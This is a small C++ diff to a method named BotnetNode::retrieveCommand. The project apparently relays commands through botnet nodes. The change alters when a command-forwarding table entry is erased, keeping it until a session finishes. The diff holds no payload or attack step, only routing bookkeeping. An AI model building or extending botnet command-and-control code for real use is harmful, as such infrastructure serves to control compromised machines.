@@ -273,10 +273,11 @@ adr BotnetNode::retrieveCommand(
 	{
 		command_fowarding retrived_command = _nevigation_table[command_res->numerics.id];
 		command_res->numerics.id = retrived_command.original_id;
-
-		_id--;
-		_nevigation_table.erase(it);
-
+		
+		/* check if session is finished */
+		if (command_res->act)
+			_nevigation_table.erase(it); 
+		
 		return retrived_command.src_addr;
 	}
 	
